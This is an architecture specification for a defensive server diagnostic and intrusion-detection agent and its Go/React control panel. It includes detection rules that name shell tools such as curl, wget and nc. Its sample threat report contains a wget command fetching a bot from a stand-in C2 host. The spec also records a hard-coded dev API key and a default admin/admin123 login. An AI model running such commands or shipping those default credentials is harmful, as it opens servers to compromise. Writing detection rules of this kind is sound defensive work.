# Diagnostic & Security Protection Agent
## Production Architecture & Engineering Specification

Version: 1.2.0
Status: Architecture Baseline (Security & Diagnostic Unified) + Control Panel Platform (sections 19–26)
Project Type: Production-grade website/server incident diagnosis and security protection platform

---

# 1. PRODUCT PURPOSE

Build a lightweight production diagnostic and security protection system whose primary purpose is:

> Detect unusual website/server behavior, defend against unauthorized access/hacking attempts, and determine the exact root cause of errors, downtime, performance degradation, resource exhaustion, and security incidents.

The system MUST prioritize:

1. **Dual Pillar Focus**: Root-cause performance diagnosis AND active security protection / intrusion detection.
2. **Very Low Overhead**: Normal operation MUST maintain $< 1\%$ CPU overhead and $< 2\text{ms}$ request latency impact.
3. **Evidence-Grounded Diagnosis & Threat Attribution**: Zero-hallucination incident reports backed strictly by telemetry.
4. **Real-Time Threat Detection**: Instant detection of webshells, unauthorized file mutations, brute-force attacks, and malicious process execution.
5. **Fail-Open & Safe Production Operation**: Monitoring failures MUST NEVER break or degrade the underlying website.
6. **Support for Shared Hosting and VPS Environments**: Graceful feature degradation when root/kernel access is unavailable.
7. **Framework-Independent Core**: Universal PHP SDK with specialized WordPress and Laravel adapters, alongside a native Go Linux Daemon.
8. **Containment & Remediation Options**: Opt-in safe quarantine of malicious drops and dynamic rate limiting without impacting benign traffic.

The system is NOT intended to continuously record every benign function call or store raw user passwords/POST bodies.

---

# 2. CORE PRINCIPLE

The system follows a strict, deterministic-first operational pipeline:

```
COLLECT (Telemetry, Metrics, Security Signals)
    ↓
BASELINE (Adaptive Performance & Request Norms)
    ↓
DETECT (Deterministic Anomaly & Threat Rules)
    ↓
INVESTIGATE (Ring Buffer Extraction & Profiling / Security Audits)
    ↓
CORRELATE (Timeline & Cross-Layer Signal Binding)
    ↓
DIAGNOSE (Root-Cause Engine + Evidence-Grounded AI Analysis)
    ↓
REPORT & PROTECT (Alerting, Threat Attribution, Safe Containment Playbooks)
```

Normal operation remains ultra-lightweight. Deep profiling and security payload inspection are activated ONLY when an anomaly or security event justifies it.

---

# 3. PRIMARY USE CASES

The system MUST investigate and defend against:

### Reliability & Performance
- Website downtime & HTTP 5xx errors
- PHP fatal errors & unhandled exceptions
- Memory exhaustion & CPU spikes
- Slow request latency & database query bottlenecks
- External API failures & timeouts
- PHP-FPM worker pool exhaustion
- Queue/cron execution failures
- Cascading failures & deployment regressions

### Security & Intrusion Defense
- **Webshell & Backdoor Drops**: Unauthorized PHP/executable file creation in `/uploads/`, `/tmp/`, or public assets.
- **Core File Tampering**: Unauthorized edits to `.htaccess`, `wp-config.php`, `.env`, `index.php`, or framework core files.
- **Suspicious Process Spawning**: Web server user (`www-data`, `nobody`, `nginx`) launching CLI shells (`sh`, `bash`), utility scripts (`curl`, `wget`, `nc`, `python`), or compilation tools (`gcc`, `make`).
- **Brute-Force & Credential Stuffing**: Volumetric auth failures against `/wp-login.php`, `/xmlrpc.php`, `/login`, or SSH.
- **Web Application Attack Signatures**: SQL Injection, Remote Code Execution (RCE), Path Traversal, and Arbitrary File Inclusion attempts causing abnormal error outputs.
- **Suspicious Outbound Network Activity**: Web server processes opening outbound socket connections to unknown external IPs/ports (C2 / data exfiltration).
- **Privilege Escalation & Account Manipulation**: Unauthorized creation of admin users or privilege escalation attempts.

---

# 4. SUPPORTED ENVIRONMENTS

The architecture supports two major deployment modes with explicit feature caps based on environment permissions.

## 4.1 Shared Hosting Mode

Available capabilities depend on PHP execution rights (cPanel, FTP/SFTP, File Manager, Composer):

**Capabilities**:
- PHP request lifecycle monitoring (duration, memory, HTTP status).
- Error & PHP Fatal capture via shutdown handlers.
- Application-level File Integrity Monitoring (FIM) via scheduled hash checks.
- Database query timing and external HTTP API latency tracking.
- Application-layer security auditing (admin login monitoring, webshell drop scanning in upload paths).
- WordPress & Laravel context-aware tracking.

**Limitations**:
- No root or kernel (`eBPF` / `inotify` kernel level) access.
- No system-wide process or OS load metrics beyond PHP runtime.
- No visibility into neighbor hosting accounts.

The UI MUST clearly display **"Shared Hosting Mode"** with active/inactive capabilities clearly labeled.

---

## 4.2 VPS / Dedicated Server Mode

Installation via native Linux package, shell installer, or `systemd` service (`diagnostic-agent.service`).

**Additional Capabilities**:
- Real-time kernel-level file activity tracking via `inotify` / `fanotify`.
- System resource metrics (CPU, RAM, Load Averages, I/O, Disk, Swap).
- Web server process monitoring (PHP-FPM worker pools, Nginx, Apache, MySQL, Redis).
- Suspicious process execution tracking (parent-child process tree monitoring).
- Network socket monitoring (detecting suspicious outbound connections).
- Kernel OOM events, system log parsing (`/var/log/auth.log`, `syslog`).
- On-demand process profiling (`perf`, `eBPF` where kernel permits).

---

# 5. HIGH-LEVEL ARCHITECTURE

```
                                 CLOUD PLATFORM
        ┌─────────────────────────────────────────────────────────────┐
        │                                                             │
        │  ┌─────────────────┐     ┌───────────────────────────────┐  │
        │  │ Ingestion API   │ ──► │ Correlation & Incident Engine │  │
        │  └─────────────────┘     └───────────────┬───────────────┘  │
        │                                          │                  │
        │  ┌─────────────────┐     ┌───────────────▼───────────────┐  │
        │  │ Dashboard UI    │ ◄── │ AI Threat & Diagnostic Agent  │  │
        │  └─────────────────┘     └───────────────────────────────┘  │
        └──────────────────────────────────▲──────────────────────────┘
                                           │ HTTPS (OTLP / Secure Protocol)
───────────────────────────────────────────┼───────────────────────────────────────────
                                     TARGET SERVER

┌──────────────────────────────────────────┴──────────────────────────────────────────┐
│                                                                                     │
│                      Diagnostic & Security Agent (Go Service)                       │
│  ┌───────────────────┬──────────────────────┬───────────────────┬────────────────┐  │
│  │ Metrics Collector │ File Integrity (FIM) │ Anomaly & Threat  │ Safe Spool/    │  │
│  │ & Process Watcher │ & Webshell Scanner   │ Engine (Rules)    │ Ring Buffer    │  │
│  └───────────────────┴──────────────────────┴───────────────────┴────────────────┘  │
│                                           ▲                                         │
│                                       Local IPC                                     │
│                                           │                                         │
│           ┌───────────────────────────────┼───────────────────────────────┐         │
│           ▼                               ▼                               ▼         │
│   WordPress SDK Adapter           Laravel SDK Adapter            PHP Core SDK      │
│   (Hooks, AJAX, Logins)           (Routes, Jobs, Errors)         (Errors, FIM, DB) │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

---

# 6. CORE COMPONENTS

## 6.1 Core Application SDK (PHP)
- **Location**: `diagnostic-sdk/`
- **Responsibilities**: Lightweight request lifecycle hooks, error/fatal interception, memory/duration telemetry, database/HTTP instrumentation, unique `request_id` propagation, local security assertion checks (e.g., upload directory execution detection).
- **Rule**: Must NEVER throw unhandled exceptions or block application execution.

## 6.2 WordPress Security & Diagnostic Adapter
- **Responsibilities**: Monitor WP hooks, REST routes, AJAX actions, WP-Cron jobs, active plugin/theme hashes, unauthorized admin account creation, failed login spikes, and theme file modifications.

## 6.3 Laravel Security & Diagnostic Adapter
- **Responsibilities**: Monitor Laravel routes, middleware, Eloquent queries, queue jobs, exception handling, custom commands, and suspicious file uploads.

## 6.4 Linux Security & Diagnostic Agent (Go Daemon)
- **Location**: `/opt/diagnostic-agent/` (`diagnostic-agent.service`)
- **Responsibilities**: OS metrics collection, process tree inspection (parent-child relationship auditing), real-time `inotify` file watching, network socket tracking, local event spooling (max 50 MB bounded queue), safe auto-quarantine execution (when enabled).

## 6.5 Threat Detection & Anomaly Engine
- **Responsibilities**: Fast, deterministic correlation of metric anomalies (CPU/RAM/latency) and security threat vectors (file dropped + process spawned + 500 error).

## 6.6 AI Threat Attribution & Diagnostic Subsystem
- **Responsibilities**: Transform normalized incident timelines and evidence payloads into human-readable threat assessments, root-cause analyses, confidence scores, and remediation playbooks.

---

# 7. AGENT DIRECTORY STRUCTURE

```
/opt/diagnostic-agent/
    bin/
        diagnostic-agent
    config/
        config.yaml
    data/
        baseline.db
        signatures.db
    logs/
        agent.log
    spool/
        events.ring
    quarantine/
        (isolated suspicious drops)
    tmp/

/etc/diagnostic-agent/config.yaml
/etc/systemd/system/diagnostic-agent.service
```

The daemon MUST run under a dedicated non-root service account (`diag-agent`), utilizing minimal privilege escalation (`sudo` rules) only for specific raw process/socket checks or quarantine actions.

---

# 8. REQUEST & INCIDENT IDENTIFICATION

Every monitored request must append a cryptographic header or generate:
- `request_id`: `req_01H...` (UUIDv7 or secure random)
- `trace_id`: `trace_01H...` (when distributed tracing is active)

Every security or reliability incident receives a globally unique identifier:
- `incident_id`: `inc_01K...`

All logs, traces, process spawns, file mutations, and database queries during the incident timeline MUST reference the corresponding `request_id` and `incident_id`.

---

# 9. NORMAL MODE vs. DIAGNOSTIC/DEFENSE MODE

### Normal Mode (Ultra-Low Overhead)
- Collect only request metadata (duration, memory, HTTP status code, basic error count).
- Periodic FIM hash checks (or low-frequency `inotify` events).
- Basic OS metrics (CPU, RAM, Load) sampled every 10–30 seconds.
- No continuous full-stack function tracing.
- No request payload logging.

### Diagnostic & Defense Mode (Triggered on Anomaly or Security Threat)
- Activated automatically for a bounded duration (default: 30–120 seconds).
- Capture complete request backtraces, exact failing file lines, SQL parameters (sanitized), process execution command-lines, and network destination IPs.
- Preserve 60-second prior rolling ring buffer (`t-60s` to `t+30s`) to build a complete incident timeline.
- Trigger optional safe containment playbooks (e.g., move unauthorized executable file to quarantine).

---

# 10. ANOMALY & THREAT DETECTION ENGINE

Anomaly and threat detection MUST rely on deterministic rules and statistical baselines (EWMA, percentiles, sliding windows), NOT AI models.

### Reliability Thresholds
- $\text{CPU}_{\text{current}} > \text{Baseline} \times \text{Multiplier}$
- $\text{Memory}_{\text{current}} > \text{Baseline} \times \text{Multiplier}$
- $\text{Latency}_{\text{request}} > P_{95} \times \text{Threshold}$
- $\text{ErrorRate}_{\text{5xx}} > \text{Baseline} + \Delta$

### Security Threat Signatures
- **File Dropped in Writable Directory**: Creation of `.php`, `.phtml`, `.py`, `.sh`, `.so`, or ELF binary in upload/tmp directory $\rightarrow$ `CRITICAL`
- **Suspicious Process Execution**: `www-data` executing `sh -c`, `bash`, `curl`, `wget`, `nc`, `python -c` $\rightarrow$ `CRITICAL`
- **Core File Mutation**: Unscheduled modification of `.htaccess`, `.env`, `wp-config.php` $\rightarrow$ `HIGH`
- **Brute Force Spike**: $> 20$ failed login attempts in 60 seconds from single IP or target endpoint $\rightarrow$ `MEDIUM`/`HIGH`
- **Outbound Connection Anomaly**: Web application process establishing direct TCP socket to unlisted remote port $\rightarrow$ `HIGH`

---

# 11. INCIDENT TRIGGERS & SEVERITY MATRIX

| Trigger Code | Incident Type | Category | Default Severity |
| :--- | :--- | :--- | :--- |
| `WEBSHELL_DETECTED` | Executable drop in non-bin path | Security | **CRITICAL** |
| `SUSPICIOUS_PROCESS_SPAWN` | Shell/Utility executed by web user | Security | **CRITICAL** |
| `CORE_FILE_TAMPERING` | Hash change on `.env`, `.htaccess`, core | Security | **CRITICAL** |
| `BRUTE_FORCE_ATTACK` | Volumetric auth failure | Security | **ERROR** |
| `OUTBOUND_C2_CONNECTION` | Unauthorized web server socket | Security | **CRITICAL** |
| `FATAL_ERROR` | Unhandled PHP Fatal / E_COMPILE | Reliability | **ERROR** |
| `CPU_MEMORY_SPIKE` | System resource exhaustion | Performance | **WARNING / ERROR** |
| `LATENCY_SPIKE` | $P_{99}$ latency breach | Performance | **WARNING** |
| `DATABASE_SLOWDOWN` | Query lock or execution spike | Performance | **WARNING** |

Combined evidence elevates severity (e.g., `WEBSHELL_DETECTED` + `SUSPICIOUS_PROCESS_SPAWN` $\rightarrow$ **CRITICAL SECURITY BREACH**).

---

# 12. SAFE CONTAINMENT & REMEDIATION PLAYBOOKS (OPT-IN)

To defend servers safely without causing unexpected downtime:

1. **Quarantine Malicious Drops**:
   - Automatically move unauthorized `.php` files created in upload paths to `/opt/diagnostic-agent/quarantine/` with execution permissions removed (`000`).
   - Leave a `.quarantined` tombstone file for diagnostic logging.

2. **Temporary IP Rate-Limiting**:
   - Signal local web server or firewall (`iptables` / `.htaccess` temporary rule) to block IPs exceeding brute-force thresholds for 15 minutes.

3. **Core File Restoration Guidance**:
   - Provide 1-click diff comparison against official WordPress/Laravel release checksums to restore modified core files.

4. **Containment Safety Rule**:
   - Containment actions MUST be strictly opt-in via configuration (`security.auto_containment: true`) and default to **dry-run / alert-only** mode.

---

# 13. FAIL-OPEN & LOCAL QUEUE ARCHITECTURE

- **Fail-Open Requirement**: Monitoring or agent crash MUST NEVER stop application requests or cause HTTP 500 errors.
- **Local Bounded Queue**: All telemetry and security events pass into a local memory/disk spool (default max size: 50 MB).
- **Backoff & Drop Policy**: If the cloud API is unreachable, events remain spooled. If the queue reaches capacity, low-priority metric telemetry is dropped first. **CRITICAL Security and Incident Metadata are NEVER dropped before raw performance metrics.**

---

# 14. DATA PRIVACY & SECRET REDACTION

The `SecretRedactor` module MUST scrub sensitive strings prior to spooling or transmission:
- Passwords (`password`, `pass`, `pwd`) $\rightarrow$ `[REDACTED]`
- Authorization Headers (`Bearer ...`, `Basic ...`) $\rightarrow$ `[REDACTED]`
- API Keys & Session Cookies (`api_key`, `token`, `PHPSESSID`, `laravel_session`) $\rightarrow$ `[REDACTED]`
- Credit Card & PII Patterns (Regex matched) $\rightarrow$ `[REDACTED]`

Source code is NEVER transmitted automatically. Only hashes, diff snippets of modified files, and stack trace line references are collected.

---

# 15. EVIDENCE-GROUNDED AI DIAGNOSIS & THREAT ANALYSIS

AI models are utilized strictly for **Analysis, Threat Attribution, and Remediation Guidance**. They are **NEVER** involved in raw signal collection or basic anomaly detection.

### Input to AI Subsystem
- Incident summary & chronological timeline.
- Grounded evidence objects (File diffs, exact error messages, process command-lines, DB queries, system metrics).
- Server environment (Shared vs. VPS, OS version, PHP version, active plugins/frameworks).

### Strict AI Operating Constraints
1. Must cite specific `evidence_id` references for every conclusion.
2. Must distinguish clearly between **CONFIRMED CAUSE** and **SUSPECTED CAUSE**.
3. Must indicate explicit confidence scores ($0.0 - 1.0$).
4. Must NEVER generate hallucinated logs, code lines, or metric numbers.
5. Must output actionable remediation steps (e.g., "Inspect plugin X fileupload.php line 42", "Remove file /uploads/cache.php").

### Sample AI Output Schema
```json
{
  "diagnosis": {
    "category": "SECURITY_BREACH",
    "classification": "WEBSHELL_EXPLOIT",
    "root_cause": "Unsanitized file upload in Plugin X allowed arbitrary PHP file creation.",
    "confidence": 0.95
  },
  "threat_attribution": {
    "attack_vector": "Arbitrary File Upload via POST /wp-content/plugins/x/upload.php",
    "dropped_file": "/wp-content/uploads/2026/09/shell.php",
    "spawned_command": "sh -c wget http://malicious-c2.com/bot -O /tmp/bot",
    "affected_component": "Plugin X v1.2"
  },
  "evidence": [
    { "event_id": "evt_01...", "reason": "File creation detected by FIM in uploads directory." },
    { "event_id": "evt_02...", "reason": "Process watcher recorded www-data spawning shell command." }
  ],
  "recommended_remediation": [
    "Quarantine /wp-content/uploads/2026/09/shell.php immediately.",
    "Deactivate Plugin X until patched.",
    "Kill process PID 48291 (wget)."
  ]
}
```

---

# 16. DEVELOPMENT PHASES

- **Phase 1 — Core Generic PHP SDK & Incident Engine**: Request tracking, error capture, local JSON spool, basic FIM scanner, tests.
- **Phase 2 — WordPress Security & Diagnostic Plugin**: Plugin/theme identification, admin login tracking, WP hooks, FIM integration.
- **Phase 3 — Laravel Security & Diagnostic Package**: Route tracking, Eloquent query hooks, exception handler, security telemetry.
- **Phase 4 — Linux Security & Diagnostic Agent (Go)**: OS metrics, `inotify` file watcher, process execution monitor, local spool manager.
- **Phase 5 — Cloud Ingestion API & Security Backend**: Multi-tenant database, event schema validator, security ingestion endpoints.
- **Phase 6 — Dashboard UI (Incidents, Security & Performance)**: Unified view for server health, active security threats, file diffs, timeline.
- **Phase 7 — Evidence-Grounded AI Threat & Root-Cause Agent**: Context builder, structured prompt normalization, AI threat attribution engine.
- **Phase 8 — Safe Containment & Automated Defense Playbooks**: Opt-in file quarantine, temporary IP rate-limiting, self-healing core checks.

---

# 17. DEVELOPMENT ORDER & AGENT GUIDELINES

The AI coding assistant MUST follow this execution order:

1. **Architecture Baseline** (This document)
2. **Domain Models & Event Schemas** (Telemetry, Errors, FIM Events, Incidents, Evidence)
3. **Core PHP SDK (`diagnostic-sdk/`)**
4. **SDK Unit & Failure Mode Tests**
5. **Local Incident Engine & Baseline Module**
6. **WordPress Security & Diagnostic Adapter**
7. **Laravel Security & Diagnostic Adapter**
8. **Linux Security Daemon (`diagnostic-agent` in Go)**
9. **Cloud Ingestion API**
10. **Dashboard UI**
11. **AI Threat Attribution Engine**
12. **Safe Containment Playbooks**

---

# 18. DEFINITION OF DONE

A module is complete ONLY when:
- Functional implementation exists.
- Unit and integration tests pass cleanly.
- Fail-open guarantees are verified (failures do not impact main application).
- Security & secret redaction audits pass.
- Overhead metrics remain within specification ($< 1\%$ CPU, $< 2\text{ms}$ latency).
- Structured logging is present.
- Documentation is fully updated.

---

# 19. CONTROL PANEL PLATFORM (GO SERVER + REACT UI)

Beyond the agent and SDKs, the project ships a CloudPanel-style control panel: a single Go binary (REST API + static UI hosting) and a React SPA.

```
Browser ──► [nginx + TLS (recommended)] ──► Go Panel (:8080)
                                              ├── /api/v1/*   REST API (AuthMiddleware)
                                              ├── /           React SPA (web/dist)
                                              ├── SQLite      /var/lib/hoatzingenz/controlpanel.db
                                              ├── VHost engine ► nginx sites-available/enabled, PHP-FPM pools
                                              └── File manager ► <HZ_WEB_ROOT>/<domain>   (default /var/www/html)
Diagnostic Agent (Go daemon) ──► POST /api/v1/security/telemetry, /api/v1/agent/metrics
PHP SDK / WordPress plugin   ──► telemetry & incidents
```

## 19.1 Repository Layout

| Path | Purpose |
| :--- | :--- |
| `cmd/server/` | Panel entrypoint: route table, SQLite init, static UI hosting, security headers |
| `api/handlers/` | HTTP handlers (`handlers.go`, `filemanager.go`, `middleware.go`) |
| `api/models/` | Domain structs (Website, FileItem, CronJob, SecurityEvent, ServerMetric, ...) |
| `api/services/` | `DBStore` (SQLite), `MemoryStore` (fallback), JWT auth, `VHostAutomationEngine` |
| `web/src/App.tsx` | React 19 + TypeScript + Tailwind control panel UI |
| `diagnostic-agent/` | Go Linux daemon (FIM, process watcher, metrics, quarantine) |
| `diagnostic-sdk/`, `wordpress-plugin/` | PHP telemetry SDK and WordPress adapter |
| `systemd/`, `install.sh` | Service units and installer (builds binaries, enables services) |

## 19.2 Runtime Configuration

| Setting | Default | Notes |
| :--- | :--- | :--- |
| `-port` | `8080` | Panel listen port |
| `-db` | `./data/controlpanel.db` (service: `/var/lib/hoatzingenz/controlpanel.db`) | Falls back to in-memory store if SQLite fails |
| `HZ_WEB_ROOT` | `/var/www/html` | Parent directory of all site roots |
| Nginx dirs | `/etc/nginx/sites-available`, `sites-enabled` | If missing, vhost engine runs in **dry-run** (log only) |
| PHP-FPM pool dir | `/etc/php/8.3/fpm/pool.d` | Currently hard-coded in `cmd/server/main.go` |

---

# 20. AUTHENTICATION & ACCESS CONTROL

- `POST /api/v1/auth/login` issues a JWT (24h); `GET /api/v1/auth/verify` validates it.
- `AuthMiddleware` accepts either `Authorization: Bearer <jwt>` or `X-API-Key` / `X-Agent-Key` (DB-verified API keys; dev fallback key `hz_agent_secret_key_2026`).
- Public routes: `/api/v1/health`, `/api/v1/auth/login`, `/api/v1/stream/events`.
- `SecurityHeadersMiddleware` is applied to every response.
- **Known gap**: the UI has no login screen yet; the file manager sends the JWT from `localStorage.hz_token` if present, otherwise the dev API key. Remove the dev key and the default `admin / admin123` login before exposing the panel.

---

# 21. WEBSITE & VHOST MANAGEMENT

| Feature | Endpoint | Status |
| :--- | :--- | :--- |
| List / create / delete websites | `/api/v1/websites` | Implemented (persisted in SQLite) |
| Stack presets: WordPress, Laravel, Node.js, Python, static, reverse proxy | `/api/v1/websites` | Implemented (templates in `vhost.go`) |
| Nginx vhost + PHP-FPM pool generation per domain | VHost engine | Implemented; real only when nginx dirs exist |
| Multi-PHP version per site (7.4 – 8.4) | `/api/v1/websites` | Config generation only; FPM pool dir fixed to 8.3 |
| Generated artifacts: nginx config, `.env` / `wp-config.php`, systemd unit, FPM pool, deploy script | UI "Production Config" tab | Implemented (templates) |
| `wp-config.php` download | handler `HandleDownloadWPConfig` | Implemented |
| Site actions (purge cache, reload FPM, ...) | `/api/v1/website/action` | Stub (returns success) |
| Cron jobs per site | `/api/v1/website/cron` | Implemented (stored; not yet installed into system cron) |
| SSL issue / custom upload / force HTTPS | `/api/v1/website/ssl` | Stub (returns fixed response) |
| WAF / hardening settings | `/api/v1/website/security` | Stub (returns fixed config) |
| Provisioning WordPress core | File manager "Install WordPress Core" | Implemented |

---

# 22. FILE MANAGER (REAL FILESYSTEM)

Implemented in `api/handlers/filemanager.go` and the "File Manager" tab of the site console. Endpoint: `/api/v1/website/files`.

| Operation | Request |
| :--- | :--- |
| List directory (folders first, sorted) | `GET ?domain=&path=` |
| Read file (≤ 5 MB) | `GET ?domain=&path=<file>` |
| Download file | `GET ?domain=&path=&download=1` |
| Save file | `POST {domain, path, content}` |
| Create file / folder | `POST {action: create \| mkdir, path}` |
| Rename | `POST {action: rename, path, new_name}` |
| Delete (recursive) | `POST {action: delete, path}` or `DELETE ?domain=&path=` |
| Change permissions | `POST {action: chmod, path, permissions: "0755"}` |
| Upload (≤ 256 MB, multipart) | `POST multipart {domain, path, files[]}` |
| Install WordPress core | `POST {action: install_wordpress}` |

Security model:
- Site root is `<HZ_WEB_ROOT>/<domain>`; the domain must match a strict hostname regex.
- Every path is cleaned and verified to stay within the site root, including **symlink escape** detection via `EvalSymlinks`.
- The site root itself cannot be deleted or renamed; uploads use `filepath.Base` on filenames.
- WordPress install downloads `https://wordpress.org/latest.tar.gz`, strips the `wordpress/` prefix, guards against path traversal in the archive, and never overwrites existing files.
- The panel process must own/write `/var/www/html/<domain>` (use `chown`/group permissions rather than running as root).

UI: breadcrumb path with Up button, folder navigation, inline editor, new file/folder, upload, download, rename, chmod, delete, `wp-config.php` / `.env` shortcut, error banner, and an "Install WordPress Core" button when `wp-includes` is absent.

---

# 23. SECURITY, TELEMETRY & MONITORING APIS

| Feature | Endpoint |
| :--- | :--- |
| Security event ingestion & listing (FIM, webshell, process, brute force) | `/api/v1/security/telemetry` |
| Server metrics (CPU, RAM, disk, load) ingestion & history | `/api/v1/agent/metrics` |
| Dashboard aggregate stats | `/api/v1/dashboard/stats` |
| Live event stream (SSE) | `/api/v1/stream/events` |
| Error diagnostics & AI root-cause analysis | `/api/v1/diagnostics/errors` (analysis is currently canned output; real AI engine is Phase 7) |
| Health check | `/api/v1/health` |

---

# 24. DATABASES, FTP, SERVICES, LOGS & EMAIL

| Feature | Endpoint | Implementation Status |
| :--- | :--- | :--- |
| MariaDB / MySQL native database & user provisioning, grants & live size calculation | `/api/v1/databases` | **Active (Live VPS)**: Executes native MySQL commands (`CREATE DATABASE`, `CREATE USER`, `GRANT ALL PRIVILEGES`), calculates table sizes from `information_schema`. |
| VPS System daemons & services (Nginx, PHP-FPM, MySQL, PostgreSQL, Redis) | `/api/v1/services` | **Active (Live VPS)**: Queries `systemctl is-active`, memory metrics via `/proc` or `ps`, and executes `restart`, `reload`, `stop`, `start`. |
| Automated Let's Encrypt TLS & Certbot certificate issuance / renewal | `/api/v1/website/ssl` | **Active (Live VPS)**: Certbot HTTP-01 challenge orchestration, x509 expiration inspection, auto-reload Nginx. |
| VPS Cron daemon scheduler | `/api/v1/website/cron` | **Active (Live VPS)**: Atomically writes crontabs into `/etc/cron.d/hz_<domain>` with `www-data` user execution. |
| Live daemon log streaming & tailing | `/api/v1/website/logs` | **Active (Live VPS)**: Tails `/var/log/nginx/<domain>_access.log`, `error.log`, and PHP-FPM pool logs. |
| FTP accounts | `/api/v1/ftp` | Record tracking and credential management in SQLite. |
| Mail domains & mailboxes | `/api/v1/email` | Read-only listing and DNS record configuration guides. |

---

# 25. CONTROL PANEL UI MODULES (React)

- Dashboard (stats, metrics charts, security overview, shared-hosting vs VPS mode toggle).
- Websites list with search and stack filter; "Add Website" wizard with stack-specific fields (DB credentials, admin user, port, Node/Python versions); "Site Ready" summary modal with copyable configs.
- Per-site console tabs:
  - **Overview & VHost**: Server tracking ID, PHP version, linked DB, and CloudPanel Quick Actions (Purge Cache, Reload FPM, Restart FPM, Reload Nginx, Fix Permissions 755/644).
  - **Production Config**: Interactive Nginx vhost, `.env`, systemd service, and deploy scripts.
  - **SSL/HTTPS**: Real x509 issuer & expiration inspection, Let's Encrypt issuance input form with Certbot trigger.
  - **File Manager**: Directory navigation, file editor, new file/folder, upload, download, rename, chmod, delete, and 1-Click WordPress core installer.
  - **Security & WAF**: SQLi, XSS, hotlink protection, and brute-force rate limiter toggles.
  - **Logs & Diagnostics**: Live switcher between Access, Error, and PHP-FPM logs with refresh button.
  - **Scheduled Cron Jobs**: Add and delete cron jobs stored in `/etc/cron.d/`.
- Databases, FTP, Email, Services (with interactive Restart/Reload/Stop/Start buttons), Security Center, and Error Diagnostics (incident modal with AI root cause) views.
- Toast notifications and auto-refresh every 10 seconds.

---

# 26. DEPLOYMENT & OPERATIONS

1. Target: Linux VPS or WSL2 Ubuntu (systemd enabled). Prerequisites: Go, Node (to build `web/dist`), nginx, PHP-FPM + extensions (`mysql curl xml mbstring zip gd`), MariaDB.
2. `sudo env "PATH=$PATH" bash ./install.sh` builds `server` and `diagnostic-agent`, installs the compiled `web/dist` UI bundle to `/opt/hoatzingenz-protection/web/dist`, installs `hoatzingenz-server.service` and `hoatzingenz-agent.service`, and enables them via systemd.
3. Directories: panel `/opt/hoatzingenz-protection`, agent `/opt/diagnostic-agent`, data `/var/lib/hoatzingenz`, sites `/var/www/html/<domain>`.
4. Update workflow: rebuild and `sudo systemctl restart hoatzingenz-server`.
5. Verify: `curl http://localhost:8080/api/v1/health` or open browser at `http://localhost:8080`.